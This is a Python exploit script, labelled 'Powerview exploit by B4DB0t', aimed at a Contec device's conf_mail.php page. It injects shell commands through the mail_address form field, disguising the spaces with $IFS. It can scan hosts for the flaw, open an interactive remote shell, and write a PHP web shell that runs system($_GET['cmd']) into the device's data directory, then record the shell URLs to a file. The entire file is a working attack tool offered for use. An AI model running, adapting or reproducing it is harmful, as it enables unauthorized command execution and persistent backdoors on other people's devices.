import requests
import sys
import random
back_door =[
    "echo$IFS\"<?php\">>/home/contec/data/shell.php",
    "echo$IFS\"if(isset(\\$_GET['cmd'])){\">>/home/contec/data/shell.php",
    "echo$IFS\"system(\\$_GET['cmd']);\">>/home/contec/data/shell.php",
    "echo$IFS\"}\">>/home/contec/data/shell.php",
    "echo$IFS\"?>\">>/home/contec/data/shell.php"
]
def cmd_exec(cmd,host):
    url = f"http://{host.strip()}/conf_mail.php"
    cmd_to_send=cmd.replace(" ","$IFS")
    cmd_to_send=f"mail_address=;{cmd_to_send};&button=%83%81%81%5B%83%8B%91%97%90M"
    #print(cmd_to_send)
    headers = {
        "Host":host.strip(),
        "Content-Type":"application/x-www-form-urlencoded",
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    }
    req=requests.post(url,data=cmd_to_send,headers=headers)
    return(req.text.split("-1")[1].split('<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">')[0])

def upload(host):
    xr=random.randrange(0,999)
    lines = len(back_door)
    print(f"[!] Number of lines : {lines} [!]")
    lin=1
    for line in back_door:
        print(f"[!] Writing Line {lin} [!]")
        if lin == 1 :
            cmd_exec(line.replace("shell",f"contec{xr}"),host)
        else :
            cmd_exec(line.replace("shell",f"contec{xr}"),host)
        lin+=1
    print(f"[*] Uploaded to : http://{host}/data/contec{xr}.php [*]")
    with open("shells_.txt","a") as out:
        out.write(f"http://{host}/data/contec{xr}.php")
        out.write("\n")
        out.close()
    return f"http://{host}/data/contec{xr}.php"

def scan(host):
    #uid=
    if "uid=" in cmd_exec("id",host):
        print(f"[+] Vulnerable {host} [+]")
if __name__=="__main__":
    print("[*] Powerview exploit by B4DB0t [*]")
    if sys.argv[1] == "shell" :
        print(f"[!] STARTING SHELL ON  {sys.argv[2]} PLEASE WAIT ... [!]")
        while True :
            cmd=input(f"shell@{sys.argv[2]} $ ")
            print(cmd_exec(cmd,sys.argv[2]))
    elif sys.argv[1] == "upload" :
        upload(sys.argv[2])
    elif sys.argv[1] == "scan" :
        print(f"[!] SCANNING {sys.argv[2]} PLEASE WAIT ... [!]")
        scan(sys.argv[2])